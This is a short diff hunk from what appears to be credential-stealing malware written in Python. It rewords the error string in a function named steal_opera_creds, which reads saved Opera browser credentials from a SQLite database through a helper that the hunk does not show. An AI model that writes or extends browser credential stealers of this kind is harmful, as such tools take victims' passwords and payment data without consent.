@@ -102,7 +102,7 @@ def steal_opera_creds(): # get opera credentials
         opera_creds = __get_opera_creds(cur)
         con.close() # Close SQLite3 connection
     except:
-        opera_creds = "Failed to steal opera credit cards"
+        opera_creds = "Failed to steal opera creds"
     finally:
         return opera_creds
 
